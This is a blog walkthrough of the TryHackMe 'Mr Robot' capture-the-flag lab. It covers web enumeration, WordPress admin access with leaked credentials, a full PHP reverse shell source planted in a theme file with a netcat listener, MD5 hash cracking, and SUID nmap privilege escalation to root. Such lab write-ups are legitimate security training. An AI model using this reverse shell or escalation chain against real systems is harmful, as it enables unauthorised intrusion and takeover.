---
title: "Mr Robot CTF"
description: Walkthrough of the Mr Robot box in Try Hack Me.
date: 2022-11-06T08:42:00-05:00
image: images/fsociety.jpg
license: GPLv3
comments: true
draft: false
toc: true
categories: ["Hacking"]
tags: ["Try Hack Me", "Linux Priv Escalation"]
author: "Said Neder"
---

![head](/images/mrrobot.png)

Welcome to a new machine walkthrough!

Now it's the time for this awesome machine that is the [Mr Robot](https://tryhackme.com/room/mrrobot) room in Try Hack Me!

## Enumeration

First my own methodology that I'm working with is to make Nmap scans, while doing some gobuster's directories discoveries, so let's go step by step.

### Nmap

`sudo nmap -sS -Pn -T5 -p- -vvv --open 10.10.112.68 -oG allPorts`
![mrrobot1](/images/mrrobot1.png)
With the `-vvv` triple verbosity flag we know already open ports without the scan being finished, giving us a bit of time to work.

### Gobuster

`gobuster dir --url http://10.10.255.165 -t 40 -w /usr/share/dirb/wordlists/common.txt --no-error --output directories.txt`

While scanning, let's take a look on the little details, Mr **Robot** hmmm, shouldn't be there some type of **robots.txt**?

Giving the result of http://10.10.32.149/robots.txt:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Remember that robots.txt is a file made for making directories of a website not visible by a search engine.

So with that said, we curled those up and we get the first flag!

`curl http://10.10.32.149/fsociety.dic`
`curl http://10.10.32.149/key-1-of-3.txt`

Finishing up with gobuster, we get the results:

```bash
/.htaccess            [Size: 218]
/.hta                 [Size: 213]
/.htpasswd            [Size: 218]
/0                    [Size: 0] [--> http://10.10.32.149/0/]
/admin                [Size: 234] [--> http://10.10.32.149/admin/]
/audio                [Size: 234] [--> http://10.10.32.149/audio/]
/atom                 [Size: 0] [--> http://10.10.32.149/feed/atom/]
/blog                 [Size: 233] [--> http://10.10.32.149/blog/]
/css                  [Size: 232] [--> http://10.10.32.149/css/]
/dashboard            [Size: 0] [--> http://10.10.32.149/wp-admin/]
/favicon.ico          [Size: 0]
/feed                 [Size: 0] [--> http://10.10.32.149/feed/]
/images               [Size: 235] [--> http://10.10.32.149/images/]
/image                [Size: 0] [--> http://10.10.32.149/image/]
/Image                [Size: 0] [--> http://10.10.32.149/Image/]
/index.html           [Size: 1188]
/index.php            [Size: 0] [--> http://10.10.32.149/]
/intro                [Size: 516314]
/js                   [Size: 231] [--> http://10.10.32.149/js/]
/license              [Size: 309]
/login                [Size: 0] [--> http://10.10.32.149/wp-login.php]
/phpmyadmin           [Size: 94]
/readme               [Size: 64]
/rdf                  [Size: 0] [--> http://10.10.32.149/feed/rdf/]
/robots.txt           [Size: 41]
/robots               [Size: 41]
/rss                  [Size: 0] [--> http://10.10.32.149/feed/]
/rss2                 [Size: 0] [--> http://10.10.32.149/feed/]
/sitemap              [Size: 0]
/sitemap.xml          [Size: 0]
/video                [Size: 234] [--> http://10.10.32.149/video/]
/wp-admin             [Size: 237] [--> http://10.10.32.149/wp-admin/]
/wp-content           [Size: 239] [--> http://10.10.32.149/wp-content/]
/wp-includes          [Size: 240] [--> http://10.10.32.149/wp-includes/]
/wp-config            [Size: 0]
/wp-cron              [Size: 0]
/wp-links-opml        [Size: 227]
/wp-load              [Size: 0]
/wp-login             [Size: 2606]
/wp-mail              [Size: 3064]
/wp-settings          [Size: 0]
/wp-signup            [Size: 0] [--> http://10.10.32.149/wp-login.php?action=register]
/xmlrpc.php           [Size: 42]
```

And we get tons of directories! we see repeating a lot the`wp` keyword, and that's because it's a wordpress site! So now we know what is our target, but let's get more knowledge about the directories of the page, since we got a dictionary from the `robots.txt` file, we can do another gobuster scan:
`gobuster dir --url http://10.10.32.149 -t 40 -w fsocity.dic -no-error --output fsocietyScan.txt`

While that's finishing, let's go into some of this directories, let's go to license:
![mrrobot2](/images/mrrobot2.png)

And we found something funny, with a base 64 attached, who is the script kitty now huh? Let's get to decoding, I like this website for anything related to base64: https://www.base64decode.org/

The result of the decode is: `elliot:ER28-0652`

Giving us a user for the wordpress site, but let's not go to there yet, there's more to discover, so check those directories that gave us the gobuster scan.

Although I was seeing my scan of the `fsociety.dic` and I didn't knew why it was taking so long, but is because the dictionary is over 800000 WORDS LONG! So no way I'm going to scan through the whole dictionary, so I terminated the scan.

## Getting in-depth

Let's go to the wordpress admin panel (`/wp-admin`) and enter the elliot credentials, having acces to the panel!

On the bottom of the page we have the wordpress version, so let's make a quick google about if there's some exploits on that specific version of wordpress (4.3.1)

Giving us as a search result a exploit database link: https://www.exploit-db.com/exploits/50255 where it says it has a RCE vulnerability (Remote Code Execution) from the wordpress admin panel (which we have access to), but before everything let's poke around the admin panel.
![mrrobot3](/images/mrrobot3.png)

This gives us more information about the users that are available in the wordpress site, now let's get into exploiting.

## Exploit

As we already know, wordpress is built with PHP, that is a back-end programming language, meaning that handles the server side of things, so we need to find a way to upload a exploit that can give us a reverse shell, and there's a github repo with a php exploit here: https://github.com/pentestmonkey/php-reverse-shell

This is the exploit we are going to use:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

As an administrator we can do anything we want so let's edit the theme files, to our advantage, giving for example the `author-bio.php` file for our reverse shell, meaning that instead of displaying the biography of the author it will now run a reverse shell for us!

![mrrobot4](/images/mrrobot4.png)

Before going to that specific page, we need to be listening in our host machine, listening meaning that we need to be ready for receiving the shell that our target is sending to us, that's why it's a reverse shell, now with netcat we can do:

```bash
nc -lnvp 443
```

Their flags meaning:

- `l`: Listen for inbound connections
- `n`: Numeric only IP addresses
- `v`: verbose
- `p`: Port specified

In my case I'm using the port 443, commonly known as the HTTPS port for listening, when we go to the specific page that would be in the themes directory since we modified the "TwentyFifteen" theme `/wp-content/themes/twentyfifteen/author-bio.php` we will get a blank screen, that's because no error happened, and we should get the shell back!

![mrrobot5](/images/mrrobot5.png)

We are in their system! But there's still work left to do, since we are the "daemon" user, (daemon means process running in linux) we need to escalate our privilages, first, let's head home!

![mrrobot6](/images/mrrobot7.png)

Being home we now know that we have another user in the system that is robot, and they have the second key that we need! But if we cat it out we will not have the permissions due to the fact we are not robot, but robot has a backup of his password hehehe, giving us access to change users, but is hashed! so we need to de-hash it first to get access to the password.

### John the ripper

Let's rip that out! We are going to use John the ripper, that is a cracker, for this case to crack that cryptographic algorithm that is MD5 what it was used to hash the password.

```bash
john passmd5.hash --wordlist=fsocity.dic --format=Raw-MD5
```

Before running this command I have created a file called `passmd5.hash` where is the hash stored, and I have the `fsocity.dic` from the `robots.txt` giving us the password:
![mrrobot7](/images/mrrobot8.png)

Being the full alphabet! Now we can switch users! Let's use `su`
![mrrobot8](/images/mrrobot9.png)

But we get a problem, that is we are not running a fully interactive shell, so we need to upgrade our shell first, so we are going to do so by running a python one liner that spawns bash for us, then let's switch users!

![mrrobot9](/images/mrrobot10.png)

We are now robot! With that said, we can now cat out the key, giving us the second flag.

### Nmap exploit

let's get to know the system and know which programs does have root permissions:
![mrrobot10](/images/mrrobot6.png)

Being the command:

```bash
find / -user root -perm /4000 2> /dev/null
```

Meaning, find all programs from the / directory with ownership of the user root, with the SUID of 4000 (can be used with root privilages without being root), and the errors throw them to nothingness (`/dev/null`)

And we find `nmap` in the list of programs that can run with root privilages without being root...

This leaves me thinking, should I use a NSE script for this? Better, let's GTFO of this restrictive shell with https://gtfobins.github.io/ !

That webpage is a repository full of unix functions that we can use to our advantage to escape restrictive shells and elevate our privilages "exploiting" bad configuration of permissions, etc...

For example, I'm going to use the shell function to get a privilaged shell from nmap, using:

```bash
nmap --interactive
nmap> !sh
```

Getting root privilages on the machine, now let's find the root flag that is not so hard to do:
![mrrobot11](/images/mrrobot11.png)

Finally getting the third and last flag, and completing the machine.

## Outro

![mrrobot12](/images/mrrobot12.png)

Wow, I just loved this machine, for real wow this was really fun and challenging, this feels rewarding since I have just started to learn pentesting and to do all this by myself it's awesome, this machine was really fun and I learned a ton from this machine.

When completing this machine you earn this [badge](https://tryhackme.com/crazyc4t/badges/mr-robot).

Thanks all of you for reading my blog, I'm really thankful and blessed for this, for you and for the great work we are putting into, I'm preparing my first youtube & odysee video soon! So tune up for that!
